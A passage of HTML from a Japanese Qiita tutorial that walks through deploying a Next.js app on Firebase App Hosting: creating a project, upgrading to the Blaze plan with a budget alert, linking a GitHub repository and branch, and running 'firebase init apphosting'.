src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F03041e9a-a8f5-4109-b6c8-fa6539100fb4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9d06c95a0886b4ffbd5ebd7078a15276\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F03041e9a-a8f5-4109-b6c8-fa6539100fb4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=ee25412d09297c3f24e880a9281dfd1f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/03041e9a-a8f5-4109-b6c8-fa6539100fb4.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"41:1-41:30\">プロジェクト作成完了</p>\n<p data-sourcepos=\"43:1-43:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F73d2caa6-4012-42c6-ac53-11b26c8c2bc0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0898209577a6856391b016e1d0275249\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F73d2caa6-4012-42c6-ac53-11b26c8c2bc0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0898209577a6856391b016e1d0275249\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F73d2caa6-4012-42c6-ac53-11b26c8c2bc0.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=ae776e03cb1b8b5aba3f0c8992c6e100 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/73d2caa6-4012-42c6-ac53-11b26c8c2bc0.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"45:1-45:43\">\n<span id=\"2blazeプランにアップグレード\" class=\"fragment\"></span><a href=\"#2blaze%E3%83%97%E3%83%A9%E3%83%B3%E3%81%AB%E3%82%A2%E3%83%83%E3%83%97%E3%82%B0%E3%83%AC%E3%83%BC%E3%83%89\"><i class=\"fa fa-link\"></i></a>2.Blazeプランにアップグレード</h2>\n<p data-sourcepos=\"47:1-47:144\">Next.js をFirebaseにてデプロイする（Firebase App Hosting を利用する）には有料のBlazeプランへの登録が必要です。</p>\n<p data-sourcepos=\"49:1-49:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"50:1-50:196\">\n<p data-sourcepos=\"50:2-50:196\">Firebase App Hosting を設定する前に、Firebase プロジェクトを作成（まだ作成していない場合）し、Blaze プランにアップグレードする必要があります。</p>\n</blockquote>\n<p data-sourcepos=\"52:1-52:80\">プロジェクト作成後、左下の<code>アップグレード</code>ボタンを押下</p>\n<p data-sourcepos=\"54:1-54:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fcd59aad7-36c3-4dc2-aeda-bd5b627296b9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c0a859e2fd70e29e510f7bbe64e6bd35\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fcd59aad7-36c3-4dc2-aeda-bd5b627296b9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c0a859e2fd70e29e510f7bbe64e6bd35\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fcd59aad7-36c3-4dc2-aeda-bd5b627296b9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=eec60afa17d375f5359429826e88d920 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/cd59aad7-36c3-4dc2-aeda-bd5b627296b9.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"56:1-56:46\">Blazeの<code>プランを選択</code>ボタンを押下</p>\n<p data-sourcepos=\"58:1-58:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fca0c8132-0677-41b0-b294-db1540641ad3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b3fdc5adf78ee86fdc22e3e2018d7649\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fca0c8132-0677-41b0-b294-db1540641ad3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b3fdc5adf78ee86fdc22e3e2018d7649\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fca0c8132-0677-41b0-b294-db1540641ad3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=15ebf400929b836265497937012ed530 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ca0c8132-0677-41b0-b294-db1540641ad3.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"60:1-61:72\"><code>Firebaseのお支払いを選択</code>を押下<br>\n（クレジットカードや住所の登録を求められます。）</p>\n<p data-sourcepos=\"63:1-63:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fcd2a4e3e-9134-4020-bc02-ab9112b1e011.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=112d9f866c7dbcc667af755e15d3496b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fcd2a4e3e-9134-4020-bc02-ab9112b1e011.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=112d9f866c7dbcc667af755e15d3496b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fcd2a4e3e-9134-4020-bc02-ab9112b1e011.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7b6f49156cd575fa3b5345929c1105ae 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/cd2a4e3e-9134-4020-bc02-ab9112b1e011.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"65:1-66:105\">予算設定額を入力<br>\n私は100円を設定しました。利用額が超えるとアラートメールを受け取れます。</p>\n<p data-sourcepos=\"68:1-68:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0665c2d3-560b-4570-95d6-4d2af84283fb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2dec4bc05307aee1c5bf754976320798\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0665c2d3-560b-4570-95d6-4d2af84283fb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2dec4bc05307aee1c5bf754976320798\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0665c2d3-560b-4570-95d6-4d2af84283fb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=1bf4ab73930c3d7500a44ade576fb077 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0665c2d3-560b-4570-95d6-4d2af84283fb.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"70:1-70:53\"><code>Cloud 請求先アカウントをリンク</code>を押下</p>\n<p data-sourcepos=\"72:1-72:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fedf99337-116a-417f-b774-3e7ef964a960.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b662760a762525890242d2a153f113bb\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fedf99337-116a-417f-b774-3e7ef964a960.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b662760a762525890242d2a153f113bb\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fedf99337-116a-417f-b774-3e7ef964a960.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=889c6b5340e696cc52fa25fe06fef658 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/edf99337-116a-417f-b774-3e7ef964a960.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"74:1-74:12\">登録完了</p>\n<p data-sourcepos=\"76:1-76:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0e9e4bd6-d410-4e27-9eab-94148020bdf2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ec40853e5fc3753a3dca654fbcb7ea21\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0e9e4bd6-d410-4e27-9eab-94148020bdf2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ec40853e5fc3753a3dca654fbcb7ea21\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0e9e4bd6-d410-4e27-9eab-94148020bdf2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=5081d77dd05db1e3828c206009452ecc 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0e9e4bd6-d410-4e27-9eab-94148020bdf2.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"78:1-78:25\">\n<span id=\"3app-hostingの設定\" class=\"fragment\"></span><a href=\"#3app-hosting%E3%81%AE%E8%A8%AD%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>3.App Hostingの設定</h2>\n<p data-sourcepos=\"80:1-80:84\">プロジェクト画面下の<code>すべての Firebase 機能を表示</code>をクリック</p>\n<p data-sourcepos=\"82:1-82:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F17d0a1ed-c0bd-414a-8ee4-a49e70f594b3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=97c10848ab368a219e545743ccb42586\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F17d0a1ed-c0bd-414a-8ee4-a49e70f594b3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=97c10848ab368a219e545743ccb42586\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F17d0a1ed-c0bd-414a-8ee4-a49e70f594b3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=55adfe6238c5909a7a2524308627a3a8 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/17d0a1ed-c0bd-414a-8ee4-a49e70f594b3.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"84:1-84:28\"><code>App Hosting</code>をクリック</p>\n<p data-sourcepos=\"86:1-86:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F8881e1fa-279c-49eb-9837-a102a32949d9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0cf84637a992b6bfa944a36d86553262\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F8881e1fa-279c-49eb-9837-a102a32949d9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0cf84637a992b6bfa944a36d86553262\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F8881e1fa-279c-49eb-9837-a102a32949d9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=fefe6b5ed5c874b0e51862f7a5a90f8d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/8881e1fa-279c-49eb-9837-a102a32949d9.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"88:1-88:20\"><code>始める</code>を押下</p>\n<p data-sourcepos=\"90:1-90:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff0bd43ea-f7e1-46d7-af8c-4fd21f0064dd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5325ed4fb2b456176001fc1a9edfdfe4\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff0bd43ea-f7e1-46d7-af8c-4fd21f0064dd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5325ed4fb2b456176001fc1a9edfdfe4\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Ff0bd43ea-f7e1-46d7-af8c-4fd21f0064dd.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=85058a9ca01d564f6fc79c3d38517e28 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f0bd43ea-f7e1-46d7-af8c-4fd21f0064dd.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"92:1-92:26\"><code>リージョン</code>を選択</p>\n<p data-sourcepos=\"94:1-94:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2a1a14a4-14a6-480e-b14b-f78cf7da4204.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=be66643df0531e10060f72cd40a605e8\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2a1a14a4-14a6-480e-b14b-f78cf7da4204.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=be66643df0531e10060f72cd40a605e8\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2a1a14a4-14a6-480e-b14b-f78cf7da4204.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=d64f8f865b06431534521f3bc957601f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2a1a14a4-14a6-480e-b14b-f78cf7da4204.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"96:1-96:39\">GitHubリポジトリをインポート</p>\n<p data-sourcepos=\"98:1-98:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F39fa0384-dd8f-4698-a1c4-479ba52a7fa2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d4478daa8ed62bc30d258c4606b6e9cb\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F39fa0384-dd8f-4698-a1c4-479ba52a7fa2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d4478daa8ed62bc30d258c4606b6e9cb\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F39fa0384-dd8f-4698-a1c4-479ba52a7fa2.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7fbe181e54a95ed059a43fef672db6f3 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/39fa0384-dd8f-4698-a1c4-479ba52a7fa2.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"100:1-100:24\">リポジトリを選択</p>\n<p data-sourcepos=\"102:1-102:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7cf8fcf9-064d-4e5d-8d24-ce4ae771044b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c1ede146d04e3ed0ed02dc9f127880fc\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7cf8fcf9-064d-4e5d-8d24-ce4ae771044b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c1ede146d04e3ed0ed02dc9f127880fc\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F7cf8fcf9-064d-4e5d-8d24-ce4ae771044b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=22b18658452fb979a4fcfdf4c48c6baa 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7cf8fcf9-064d-4e5d-8d24-ce4ae771044b.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"104:1-104:42\">デプロイしたいブランチを選択</p>\n<p data-sourcepos=\"106:1-106:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe557f31b-35dc-420b-ba66-c952af32deca.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c4f72146e0db557ad0f2191add592300\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe557f31b-35dc-420b-ba66-c952af32deca.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c4f72146e0db557ad0f2191add592300\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe557f31b-35dc-420b-ba66-c952af32deca.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=8abb3598312eb01de4a18c111f851598 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e557f31b-35dc-420b-ba66-c952af32deca.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"108:1-108:35\"><code>終了してデプロイ</code>を押下</p>\n<h2 data-sourcepos=\"112:1-112:47\">\n<span id=\"4プロジェクト設定ファイル作成\" class=\"fragment\"></span><a href=\"#4%E3%83%97%E3%83%AD%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E8%A8%AD%E5%AE%9A%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>4.プロジェクト設定ファイル作成</h2>\n<p data-sourcepos=\"114:1-114:57\">ローカルのターミナル上でコマンドを実行</p>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"116:1-118:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>firebase init apphosting\n</code></pre></div></div>\n<p data-sourcepos=\"120:1-120:34\"><code>Use an existing project</code>を選択</p>\n<p data-sourcepos=\"122:1-122:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F28a09987-653e-4ed2-bb5f-9de3e64f9689.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ff719518d1dfcaccce7bbce0a33fd14d\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F28a09987-653e-4ed2-bb5f-9de3e64f9689.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ff719518d1dfcaccce7bbce0a33fd14d\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F28a09987-653e-4ed2-bb5f-9de3e64f9689.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=2c66702372e6be6f6c4bf0a7db0f2372 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/28a09987-653e-4ed2-bb5f-9de3e64f9689.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"124:1-124:41\"><code>作成したプロジェクト</code>を選択</p>\n<p data-sourcepos=\"126:1-126:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe5389b32-e6b7-4e76-aab1-044673209e2d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b836b156fdd20d8c71df04bd4092e92b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe5389b32-e6b7-4e76-aab1-044673209e2d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b836b156fdd20d8c71df04bd4092e92b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe5389b32-e6b7-4e76-aab1-044673209e2d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6d585a1992ff0c259bb2270e56f8684b 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e5389b32-e6b7-4e76-aab1-044673209e2d.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"128:1-128:38\"><code>Link to an existing backend</code>を選択</p>\n<p data-sourcepos=\"130:1-130:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4bc1e429-de24-4411-b538-ab7c76e65da1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=dc7116f19566e23b5f34e0739e92a527\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4bc1e429-de24-4411-b538-ab7c76e65da1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=dc7116f19566e23b5f34e0739e92a527\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4bc1e429-de24-4411-b538-ab7c76e65da1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=72061878e0edfa85fb3e06990f78b874 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/4bc1e429-de24-4411-b538-ab7c76e65da1.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"132:1-132:132\">Which backend would you ~ ?でリンクしたいバックエンドを聞かれるので、作成したバックエンド名を入力</p>\n<p data-sourcepos=\"134:1-134:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F887dddcc-0c8b-4a01-b660-9a3164193f71.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=93203c2a0099407fb15b579cb09f98f0\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F887dddcc-0c8b-4a01-b660-9a3164193f71.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=93203c2a0099407fb15b579cb09f98f0\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F887dddcc-0c8b-4a01-b660-9a3164193f71.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=abb53709bd9b50c3e1075d10554fecac 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/887dddcc-0c8b-4a01-b660-9a3164193f71.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"136:1-136:82\">FirebaseコンソールのApp Hostingを選択すると名称が載っています</p>\n<p data-sourcepos=\"138:1-138:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F367cc7b1-de02-4ca1-b72f-acd3db3dc46d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=cd98fb65b36929ebb2d39f5f33745cf2\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F367cc7b1-de02-4ca1-b72f-acd3db3dc46d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=cd98fb65b36929ebb2d39f5f33745cf2\" alt=\"image.png\" 